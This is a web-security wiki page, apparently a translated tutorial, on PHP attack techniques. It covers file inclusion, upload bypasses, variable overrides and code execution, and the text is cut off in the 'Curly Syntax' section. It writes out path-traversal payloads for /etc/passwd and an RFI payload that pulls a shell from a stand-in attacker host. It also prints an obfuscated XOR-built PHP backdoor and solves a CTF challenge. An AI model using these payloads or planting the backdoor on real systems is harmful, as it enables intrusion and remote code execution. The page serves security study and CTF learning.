      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#bypassing-the-upload-check" class="md-nav__link">
    Bypassing the upload check
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#variable-coverage" class="md-nav__link">
    Variable coverage
  </a>
  
    <nav class="md-nav" aria-label="Variable coverage">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#global-variable-override" class="md-nav__link">
    Global Variable Override
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#extract-variable-override" class="md-nav__link">
    extract() variable override
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#import_request_variables-variable-override" class="md-nav__link">
    import_request_variables Variable Override
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#parse_str-variable-override" class="md-nav__link">
    parse_str() variable override
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#command-execution" class="md-nav__link">
    Command Execution
  </a>
  
    <nav class="md-nav" aria-label="Command Execution">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#direct-execution-code" class="md-nav__link">
    Direct execution code
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#preg_replace-code-execution" class="md-nav__link">
    preg_replace() Code Execution
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#preg_match-code-execution" class="md-nav__link">
    preg_match Code Execution
  </a>
  
    <nav class="md-nav" aria-label="preg_match Code Execution">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#construct-_get-read" class="md-nav__link">
    Construct _GET read
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-the-_get-parameter" class="md-nav__link">
    Get the _GET parameter
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#incoming-parameters" class="md-nav__link">
    Incoming parameters
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dynamic-function-execution" class="md-nav__link">
    Dynamic function execution
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#backquote-command-execution" class="md-nav__link">
    Backquote command execution
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#curly-syntax" class="md-nav__link">
    Curly Syntax
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#callback" class="md-nav__link">
    Callback
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#deserialization" class="md-nav__link">
    Deserialization
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#php-features" class="md-nav__link">
    PHP Features
  </a>
  
    <nav class="md-nav" aria-label="PHP Features">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#array" class="md-nav__link">
    Array
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#magic-hash" class="md-nav__link">
    Magic Hash
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hex-conversion" class="md-nav__link">
    Hex conversion
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#type-conversion" class="md-nav__link">
    Type conversion
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#looseness-of-parameters-of-built-in-functions" class="md-nav__link">
    Looseness of parameters of built-in functions
  </a>
  
    <nav class="md-nav" aria-label="Looseness of parameters of built-in functions">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#md5" class="md-nav__link">
    md5()
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#strcmp" class="md-nav__link">
    strcmp()
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#switch" class="md-nav__link">
    switch()
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#in_array" class="md-nav__link">
    in_array()
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#looking-for-source-code-backup" class="md-nav__link">
    Looking for source code backup
  </a>
  
    <nav class="md-nav" aria-label="Looking for source code backup">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#hg-source-code-leak" class="md-nav__link">
    hg Source code leak
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#git-source-leaks" class="md-nav__link">
    Git Source leaks
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ds_store-file-leaked" class="md-nav__link">
    .DS_Store File leaked
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#website-backup-file" class="md-nav__link">
    Website backup file
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#svn-leak" class="md-nav__link">
    SVN Leak
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web-inf-webxml-leaked" class="md-nav__link">
    WEB-INF / web.xml leaked
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cvs-leak" class="md-nav__link">
    CVS Leak
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    References
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/anakilivo/wiki/edit/main/docs/web/php.md" title="Edit this page" class="md-content__button md-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
                  </a>
                
                
                  <h1>PHP</h1>
                
                <ul>
<li><a href="..">русский</a></li>
</ul>
<h2 id="file-contains">File contains</h2>
<p>Common functions that cause files to be included are:</p>
<ul>
<li>PHP：<code>include()</code>，<code>include_once()</code>，<code>require()</code>，<code>require_once()</code>，<code>fopen()</code>，<code>readfile()</code></li>
<li>JSP Servlet ： <code>ava.io.File ()</code> ， <code>java.io.FileReader ()</code></li>
<li>ASP：<code>includefile</code>，<code>includevirtual</code></li>
</ul>
<p>When PHP includes a file, it will be executed as PHP code, regardless of the type of file.</p>
<h3 id="a-local-file-contains">A local file contains</h3>
<p>The local file contains, Local File Inclusion, LFI.</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="s1">&#39;/home/wwwrun/&#39;</span><span class="o">.</span><span class="nv">$file</span><span class="o">.</span><span class="s1">&#39;.php&#39;</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">include</span> <span class="s1">&#39;/home/wwwrun/&#39;</span><span class="o">.</span><span class="nv">$file</span><span class="o">.</span><span class="s1">&#39;.php&#39;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</code></pre></div>
<p>The above code has a local file containing, and the contents of the <code>/etc/passwd</code> file can be read by truncating %00.</p>
<ul>
<li>
<p><code>%00</code> truncation</p>
<pre><code>```text
?file=../../../../../../../../../etc/passwd%00
```

Requires `magic_quotes_gpc=off`, PHP is less than 5.3.4.
</code></pre>
</li>
<li>
<p>Path length truncation</p>
<pre><code>```text
?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.
```

Linux requires a file name longer than 4096 and Windows needs to be longer than 256.
</code></pre>
</li>
<li>
<p>Point number truncation</p>
<pre><code>```text
?file = ... / ... // ... // ... // ... / / boot.ini/ ……… [...] …………
```

For Windows only, the dot number needs to be longer than 256.
</code></pre>
</li>
</ul>
<h3 id="remote-file-contains">Remote file contains</h3>
<p>The remote file contains, Remote File Inclusion, RFI.</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$route</span> <span class="o">==</span> <span class="s2">&quot;share&quot;</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">require_once</span> <span class="nv">$basePath</span> <span class="o">.</span> <span class="s2">&quot;/action/m_share.php&quot;</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$route</span> <span class="o">==</span> <span class="s2">&quot;sharelink&quot;</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">require_once</span> <span class="nv">$basePath</span> <span class="o">.</span> <span class="s2">&quot;/action/m_sharelink.php&quot;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</code></pre></div>
<p>Constructs the value of the variable <code>basePath</code>.</p>
<div class="highlight"><pre><span></span><code>/?basePath=http://attacker/phpshell.txt?
</code></pre></div>
<p>The final code is executed</p>
<div class="highlight"><pre><span></span><code><span class="x">require_once &quot;http://attacker/phpshell.txt?/action/m_share.php&quot;;</span>
</code></pre></div>
<p>The part after the question mark is interpreted as the querystring of the URL, which is also a kind of "truncation".</p>
<ul>
<li>
<p>Normal remote file contains</p>
<pre><code>```text
?file=[http|https|ftp]://example.com/shell.txt
```

Need `allow_url_fopen=On` and `allow_url_include=On`.
</code></pre>
</li>
<li>
<p>Utilize PHP stream input</p>
<pre><code>```
?file=php://input
```

Need `allow_url_include=On`.
</code></pre>
</li>
<li>
<p>Utilize PHP stream filter</p>
<pre><code>```
?file=php://filter/convert.base64-encode/resource=index.php
```

Need `allow_url_include=On`.
</code></pre>
</li>
<li>
<p>Use data URIs</p>
<pre><code>```
?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=
```

Need `allow_url_include=On`.
</code></pre>
</li>
<li>
<p>Execute with XSS</p>
<pre><code>```
?file=http://127.0.0.1/path/xss.php?xss=phpcode
```

Need `allow_url_fopen=On`, `allow_url_include=On` and the firewall or whitelist is not allowed to access the 
external network, first find an XSS vulnerability in the same site, including this page, you can inject 
malicious code.
</code></pre>
</li>
</ul>
<h2 id="file-upload">File Upload</h2>
<p>A file upload vulnerability is when a user uploads an executable script file and obtains the ability to execute
server-side commands through this file. In most cases, file upload vulnerabilities generally refer to the problem of
uploading a web script that can be parsed by the server, a so-called webshell issue. To complete this attack, several
conditions are required. First, the uploaded file can be executed by the WEB container. Secondly, the user can access
the file from the WEB. Finally, if the uploaded file is changed by security check, formatting, image compression, etc.
Content may cause the attack to fail.</p>
<h3 id="bypassing-the-upload-check">Bypassing the upload check</h3>
<ul>
<li>
<p>Front end check extension</p>
<pre><code>Capture the package and bypass it.
</code></pre>
</li>
<li>
<p><code>Content-Type</code> detection file type</p>
<pre><code>Capture the package to modify the `Content-Type` type to match the whitelist rules.
</code></pre>
</li>
<li>
<p>Add a suffix to the server</p>
<pre><code>Try `%00` truncation.
</code></pre>
</li>
<li>
<p>Server extension detection</p>
<pre><code>Exploit the vulnerability.
</code></pre>
</li>
<li>
<p>Apache parsing</p>
<pre><code>`phpshell.php.rar.rar.rar.rar` Because Apache does not know `.rar` this file type, so it will traverse the 
suffix to `.php`, and then think this is a PHP file.
</code></pre>
</li>
<li>
<p>IIS parsing</p>
<pre><code>When the file name is `abc.asp;xx.jpg` under IIS 6, it will be parsed as `abc.asp`.
</code></pre>
</li>
<li>
<p>PHP CGI path resolution</p>
<pre><code>When you visit `http://www.a.com/path/test.jpg/notexist.php`, `test.jpg` will be parsed as PHP, and 
`notexist.php` is a non-existent file. At this point, the configuration of Nginx is as follows

```nginx
location ~ \.php$ {
    root html;
    fastcgi_pass 127.0.0.1:9000;
    fastcgi_index index.php;
    fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name;
    include fastcgi_param;
}
```
</code></pre>
</li>
<li>
<p>other methods</p>
<pre><code>The suffix case, double write, special suffix such as `php5`, etc., modify the content of the package to the 
WAF and so on.
</code></pre>
</li>
</ul>
<h2 id="variable-coverage">Variable coverage</h2>
<h3 id="global-variable-override">Global Variable Override</h3>
<p>Variables that are not initialized and can be controlled by the user are likely to cause security problems.</p>
<div class="highlight"><pre><span></span><code>register_globals = ON
</code></pre></div>
<p>Example</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="k">echo</span> <span class="s2">&quot;Register_globals&quot;</span> <span class="o">.</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;register_globals&quot;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&lt;br/&gt;&quot;</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$auth</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;private!&quot;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</code></pre></div>
<p>When <code>register_globals=ON</code>, submit <code>test.php?auth=1</code>, the <code>auth</code> variable will be automatically assigned.</p>
<h3 id="extract-variable-override"><code>extract()</code> variable override</h3>
<p>The <code>extract()</code> function can import variables from an array into the current symbol table, which is defined as</p>
<div class="highlight"><pre><span></span><code>int extract(array $var_array [, int $extract_type [, string $prefix ]] )
</code></pre></div>
<p>The second parameter specifies the behavior of the function when it is imported into the symbol table. The two most
common values are <code>EXTR_OVERWRITE</code> and <code>EXTR_SKIP</code>.</p>
<p>When the value is <code>EXTR_OVERWRITE</code>, in the process of importing variables into the symbol table, if the variable name
conflicts, all variables are overwritten; the value of <code>EXTR_SKIP</code> means skipping without overwriting. If the second
parameter is not specified, <code>EXTR_OVERWRITE</code> is used by default.</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="nv">$auth</span> <span class="o">=</span> <span class="s2">&quot;0&quot;</span><span class="p">;</span>
    <span class="nb">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$auth</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;private!&quot;</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;public!&quot;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</code></pre></div>
<p>Variable coverage can occur when the <code>extract()</code> function exports variables from an array that the user can control.</p>
<h3 id="import_request_variables-variable-override"><code>import_request_variables</code> Variable Override</h3>
<div class="highlight"><pre><span></span><code>bool import_request_variables(string $types [, string $prefix])
</code></pre></div>
<p><code>import_request_variables</code> Imports variables from GET, POST, and Cookies into the global. Use this function to simply
specify the type.</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="nv">$auth</span> <span class="o">=</span> <span class="s2">&quot;0&quot;</span><span class="p">;</span>
    <span class="nb">import_request_variables</span><span class="p">(</span><span class="s2">&quot;G&quot;</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$auth</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;private!&quot;</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;public!&quot;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</code></pre></div>
<p><code>import_request_variables("G")</code> specifies the variables to be imported into the GET request, and submits the test
coverage of <code>test.php?auth=1</code>.</p>
<h3 id="parse_str-variable-override"><code>parse_str()</code> variable override</h3>
<div class="highlight"><pre><span></span><code>void parse_str(string $str [, array &amp;$arr ])
</code></pre></div>
<p>The <code>parse_str()</code> function is usually used to parse the querystring in a URL, but when the parameter value can be
controlled by the user, it is likely to cause variable coverage.</p>
<div class="highlight"><pre><span></span><code><span class="x">//var.php?var=new variable override</span>
<span class="x">$var = &quot;init&quot;;</span>
<span class="x">parse_str($_SERVER[&quot;QUERY_STRING&quot;]);</span>
<span class="x">print $var;</span>
</code></pre></div>
<p>Functions similar to <code>parse_str()</code> also have <code>mb_parse_str()</code>.</p>
<h2 id="command-execution">Command Execution</h2>
<h3 id="direct-execution-code">Direct execution code</h3>
<p>There are quite a few functions in PHP that can execute code directly.</p>
<div class="highlight"><pre><span></span><code><span class="x">eval();</span>
<span class="x">assert();</span>
<span class="x">system();</span>
<span class="x">exec();</span>
<span class="x">shell_exec();</span>
<span class="x">passthru();</span>
<span class="x">escapeshellcmd();</span>
<span class="x">pcntl_exec();</span>
<span class="x">......</span>
</code></pre></div>
<h3 id="preg_replace-code-execution"><code>preg_replace()</code> Code Execution</h3>
<p>The first argument to <code>preg_replace()</code> allows code execution if the <code>/e</code> mode modifier is present.</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="nv">$var</span> <span class="o">=</span> <span class="s2">&quot;&lt;tag&gt;phpinfo()&lt;/tag&gt;&quot;</span><span class="p">;</span>
    <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/&lt;tag&gt;(.*?)&lt;/tag&gt;/e&quot;</span><span class="p">,</span> <span class="s2">&quot;addslashes(1)&quot;</span><span class="p">,</span> <span class="nv">$var</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</code></pre></div>
<p>If you don't have the <code>/e</code> modifier, you can try %00 truncation.</p>
<h3 id="preg_match-code-execution"><code>preg_match</code> Code Execution</h3>
<p><code>preg_match</code> performs a matching regular expression, allowing the code to execute if the match is successful.</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="k">include</span> <span class="s1">&#39;flag.php&#39;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
        <span class="nv">$code</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">40</span><span class="p">){</span>
            <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Long.&quot;</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">&quot;/[A-Za-z0-9]+/&quot;</span><span class="p">,</span> <span class="nv">$code</span><span class="p">)){</span>
            <span class="k">die</span><span class="p">(</span><span class="s2">&quot;NO.&quot;</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$code</span><span class="p">);</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="c1">//$hint =  &quot;php function getFlag() to get flag&quot;;</span>
<span class="cp">?&gt;</span><span class="x"></span>
</code></pre></div>
<p>This question is a question from the plum wine master when the <code>xman</code> training session. This series of code descriptions
is like this. We want to bypass the passing of regular numbers and alphabetic strings such as <code>AZ</code>, <code>az</code>, <code>0-9</code>, and
convert non-alphanumeric characters into various transformations. Can construct any character in <code>az</code>, and the string
length is less than <code>40</code>. Then use <code>PHP</code> to allow dynamic function execution features, stitch out a function name, here
we are <code>getFlag</code>, and then dynamically execute the code.</p>
<p>So, the question we need to consider is how to pass various transformations so that we can successfully read the
<code>getFlag</code> function and get the <code>webshell</code>.</p>
<p>Before we understand this, we first need to understand the concept of XOR <code>^</code> in <code>PHP</code>.</p>
<p>Let's take a look at the following code:</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="k">echo</span> <span class="s2">&quot;A&quot;</span> <span class="o">^</span> <span class="s2">&quot;?&quot;</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span>
</code></pre></div>
<p><img alt="answer1" src="../../assets/img/web/answer1.png" /></p>
<p>We can see that the output is the character <code>~</code>. The reason for this is because the code <code>A</code> and the character <code>?</code> are
XORed in the code. In <code>PHP</code>, when two variables are XORed, the string is first converted to an <code>ASCII</code> value, then the
<code>ASCII</code> value is converted to binary and then XORed, XOR is completed, and the result is converted from binary. Become
an <code>ASCII</code> value and convert the <code>ASCII</code> value to a string. XOR operations are also sometimes used to exchange the
values of two variables.</p>
<p>Like the example above</p>
<p>The <code>ASCII</code> value of <code>A</code> is <code>65</code> and the corresponding binary value is <code>01000001</code>.</p>
<p>The ASCII value of <code>?</code> is <code>63</code> and the corresponding binary value is <code>00111111</code>.</p>
<p>The value of the exclusive OR binary is <code>‭01111110‬</code>, the corresponding <code>ASCII</code> value is <code>126</code>, and the corresponding
string value is <code>~</code>.</p>
<p>We all know that <code>PHP</code> is a weakly typed language, that is, in <code>PHP</code> we can declare a variable directly and initialize
or assign it without declaring the type of the variable. It is precisely because of the <code>PHP</code> weak type that we
implicitly convert the variable type of <code>PHP</code> and use this feature to perform some unconventional operations. If you
convert an integer to a string, treat a boolean as an integer, or treat a string as a function, let's look at a piece of
code:</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="k">function</span> <span class="nf">B</span><span class="p">(){</span>
        <span class="k">echo</span> <span class="s2">&quot;Hello Angel_Kitty&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$_</span><span class="o">++</span><span class="p">;</span>
    <span class="nv">$__</span><span class="o">=</span> <span class="s2">&quot;?&quot;</span> <span class="o">^</span> <span class="s2">&quot;}&quot;</span><span class="p">;</span>
    <span class="nv">$__</span><span class="p">();</span>
<span class="cp">?&gt;</span><span class="x"></span>
</code></pre></div>
<p><img alt="answer2" src="../../assets/img/web/answer2.png" /></p>
<p>Let's analyze the above code together:</p>
<ol>
<li><code>$_++;</code> This line of code means to increment the variable named <code>"_"</code>, the default value of the variable undefined
   in <code>PHP</code> <code>null</code>, <code>null== False==0</code>, we can get a number by auto-incrementing the undefined variable without using any
   numbers.</li>
<li><code>$__= "?" ^ "}";</code> XOR the characters <code>?</code> and <code>}</code>, and get the result <code>B</code> assigned to the variable named <code>__</code>
   (two underscores)</li>
<li><code>$__();</code> Through the above assignment operation, the value of the variable <code>$__</code> is <code>B</code>, so this line can be
   regarded as <code>B()</code>. In <code>PHP</code>, this line of code represents The function <code>B</code> is called, so the result is
   <code>Hello Angel_Kitty</code>. In <code>PHP</code>, we can treat strings as functions.</li>
</ol>
<p>Seeing this, I believe that if you see a similar <code>PHP</code> backdoor, you should not be so confused. You can use the sentence
analysis of the backdoor code to understand the functions that the backdoor wants to achieve.</p>
<p>We want to use this backdoor to create strings that bypass the detection and are useful to us, such as <code>_POST</code>,
<code>system</code> , <code>call_user_func_array</code>, or whatever we need.</p>
<p>Here is a very simple non-alphanumeric <code>PHP</code> backdoor:</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="o">@</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span> <span class="c1">// $_ = 1</span>
    <span class="nv">$__</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;#&quot;</span> <span class="o">^</span> <span class="s2">&quot;|&quot;</span><span class="p">);</span> <span class="c1">// $__ = _</span>
    <span class="nv">$__</span> <span class="o">.=</span> <span class="p">(</span><span class="s2">&quot;.&quot;</span> <span class="o">^</span> <span class="s2">&quot;~&quot;</span><span class="p">);</span> <span class="c1">// _P</span>
    <span class="nv">$__</span> <span class="o">.=</span> <span class="p">(</span><span class="s2">&quot;/&quot;</span> <span class="o">^</span> <span class="s2">&quot;`&quot;</span><span class="p">);</span> <span class="c1">// _PO</span>
    <span class="nv">$__</span> <span class="o">.=</span> <span class="p">(</span><span class="s2">&quot;|&quot;</span> <span class="o">^</span> <span class="s2">&quot;/&quot;</span><span class="p">);</span> <span class="c1">// _POS</span>
    <span class="nv">$__</span> <span class="o">.=</span> <span class="p">(</span><span class="s2">&quot;{&quot;</span> <span class="o">^</span> <span class="s2">&quot;/&quot;</span><span class="p">);</span> <span class="c1">// _POST </span>
    <span class="nv">${$__}</span><span class="p">[</span><span class="o">!</span><span class="nv">$_</span><span class="p">](</span><span class="nv">${$__}</span><span class="p">[</span><span class="nv">$_</span><span class="p">]);</span> <span class="c1">// $_POST[0]($_POST[1]);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</code></pre></div>
<p>Here I explain, <code>.=</code> is a string connection, see <code>PHP</code> syntax for details.</p>
<p>We can even merge the above code into one line, making the program less readable, the code is as follows:</p>
<div class="highlight"><pre><span></span><code><span class="x">$__ = (&quot;#&quot; ^ &quot;|&quot;) . (&quot;.&quot; ^ &quot;~&quot;) . (&quot;/&quot; ^ &quot;`&quot;) . (&quot;|&quot; ^ &quot;/&quot;) . (&quot;{&quot; ^ &quot;/&quot;);</span>
</code></pre></div>
<p>Looking back at the question of the <code>xman</code> training, our idea is to bypass the string of characters by constructing XOR,
so how do we construct this string so that the length is less than <code>40</code>?</p>
<p>We finally want to read the <code>getFlag</code> function, we need to construct a <code>_GET</code> to read this function, we finally
construct the following string:</p>
<p><img alt="payloads" src="../../assets/img/web/payloads.png" /></p>
<p>It may be that many small partners still can't understand how this string is constructed. Let's analyze the segment
string.</p>
<h4 id="construct-_get-read">Construct <code>_GET</code> read</h4>
<p>First we have to know what <code>X_GET</code> is from XOR. After my attempts and analysis, I came to the following
conclusion:</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="k">echo</span> <span class="s2">&quot;`{{{&quot;</span> <span class="o">^</span> <span class="s2">&quot;?&lt;&gt;/&quot;</span><span class="p">;</span> <span class="c1">//_GET</span>
<span class="cp">?&gt;</span><span class="x"></span>
</code></pre></div>
<p>What is the meaning of this code? Because of the 40-character length limit, webshells that were previously
XOR-to-character-spliced cannot be used. Here you can use the backquotes <code>`</code> and <code>Linux</code> under the php to
execute the command <code>?</code></p>
<ul>
<li><code>?</code> means matching one character</li>
<li><code>`</code> indicates execution of the command</li>
<li><code>`</code> Parsing a special string</li>
</ul>
<p>Since <code>?</code> can only match one character, this way of writing means looping and matching. We will break it down to see:</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="k">echo</span> <span class="s2">&quot;{&quot;</span> <span class="o">^</span> <span class="s2">&quot;&lt;&quot;</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span>
</code></pre></div>
<p><img alt="answer3" src="../../assets/img/web/answer3.png" /></p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="k">echo</span> <span class="s2">&quot;{&quot;</span> <span class="o">^</span> <span class="s2">&quot;&gt;&quot;</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span>
</code></pre></div>
<p><img alt="answer4" src="../../assets/img/web/answer4.png" /></p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="k">echo</span> <span class="s2">&quot;{&quot;</span> <span class="o">^</span> <span class="s2">&quot;/&quot;</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span>
</code></pre></div>
<p><img alt="answer5" src="../../assets/img/web/answer5.png" /></p>
<p>So we can know that <code>_GET</code> is constructed like this!</p>
<h4 id="get-the-_get-parameter">Get the <code>_GET</code> parameter</h4>
<p>How do we get the <code>_GET</code> parameter? We can construct the following string:</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="k">echo</span> <span class="nv">${$_}</span><span class="p">[</span><span class="nx">_</span><span class="p">](</span><span class="nv">${$_}</span><span class="p">[</span><span class="nx">__</span><span class="p">]);</span> <span class="c1">//$_GET[_]($_GET[__])</span>
<span class="cp">?&gt;</span><span class="x"></span>
</code></pre></div>
<p>According to the previous construction, <code>$_</code> has become <code>_GET</code>. Naturally, <code>$_ = _GET</code>. We built <code>$_GET[__]</code> to get the
parameter values.</p>
<h4 id="incoming-parameters">Incoming parameters</h4>
<p>At this point we just need to call the <code>getFlag</code> function to get the <code>webshell</code> just fine, constructed as follows:</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="k">echo</span> <span class="nv">$_</span> <span class="o">=</span> <span class="nx">getFlag</span><span class="p">;</span> <span class="c1">//getFlag</span>
<span class="cp">?&gt;</span><span class="x"></span>
</code></pre></div>
<p>So connect all the parameters and you're done.</p>
<p><img alt="payloads" src="../../assets/img/web/payloads.png" /></p>
<p>The results are as follows:</p>
<p><img alt="flag" src="../../assets/img/web/flag.png" /></p>
<p>So we successfully read the flag!</p>
<h3 id="dynamic-function-execution">Dynamic function execution</h3>
<p>User-defined functions can lead to code execution.</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="nv">$dyn_func</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;dyn_func&quot;</span><span class="p">];</span>
    <span class="nv">$argument</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;argument&quot;</span><span class="p">];</span>
    <span class="nv">$dyn_func</span><span class="p">(</span><span class="nv">$argument</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</code></pre></div>
<h3 id="backquote-command-execution">Backquote command execution</h3>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="k">echo</span> <span class="sb">`ls -la`</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span>
</code></pre></div>
<h3 id="curly-syntax">Curly Syntax</h3>
<p>PHP's Curly Syntax can also lead to code execution, it will execute the code between the curly braces and replace the
results.</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
